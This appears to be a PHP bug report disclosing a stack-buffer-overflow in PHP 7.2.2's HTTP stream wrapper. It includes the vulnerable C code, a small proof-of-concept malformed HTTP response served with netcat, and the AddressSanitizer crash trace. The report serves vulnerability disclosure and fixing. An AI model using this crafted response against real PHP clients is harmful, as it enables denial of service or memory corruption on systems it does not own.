@@ -1,0 +1,108 @@
+Description:
+------------
+The latest PHP distributions contain a memory corruption bug while parsing malformed HTTP response packets. Vulnerable code at:
+
+php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723
+
+			if (tmp_line[tmp_line_len - 1] == '\n') {
+				--tmp_line_len;
+				if (tmp_line[tmp_line_len - 1] == '\r') {
+					--tmp_line_len;
+				}
+}
+
+If the proceeding buffer contains '\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go do -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.
+
+$ bin/php --version
+PHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )
+Copyright (c) 1997-2018 The PHP Group
+Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
+
+
+Test script:
+---------------
+$ xxd -g 1 poc
+0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..
+
+$ nc -vvlp 8080 < poc
+Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)
+GET / HTTP/1.0
+Host: localhost:8080
+Connection: close
+
+$ bin/php -r 'file_get_contents("http://localhost:8080");'
+
+Expected result:
+----------------
+NO CRASH
+
+Actual result:
+--------------
+$ bin/php -r 'file_get_contents("http://localhost:8080");'
+=================================================================
+==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac
+READ of size 1 at 0xbfc038ef thread T0
+    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723
+    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979
+    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027
+    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550
+    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224
+    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573
+    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731
+    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760
+    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082
+    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123
+    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134
+    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042
+    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404
+    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
+    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)
+Address 0xbfc038ef is located at offset 607 in frame <php_stream_url_wrap_http_ex> of T0's stack:
+  This frame has 13 object(s):
+    [32, 36) 'transport_string'
+    [96, 100) 'errstr'
+    [160, 164) 'http_header_line_length'
+    [224, 232) 'timeout'
+    [288, 296) 'req_buf'
+    [352, 360) 'tmpstr'
+    [416, 432) 'ssl_proxy_peer_name'
+    [480, 496) 'http_header'
+    [544, 576) 'buf'
+    [608, 736) 'tmp_line'
+    [768, 1792) 'location'
+    [1824, 2848) 'new_path'
+    [2880, 3904) 'loc_path'
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex
+Shadow bytes around the buggy address:
+  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4
+  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4
+  0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4
+  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00
+=>0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00
+  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2
+  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+==26249== ABORTING
+Aborted
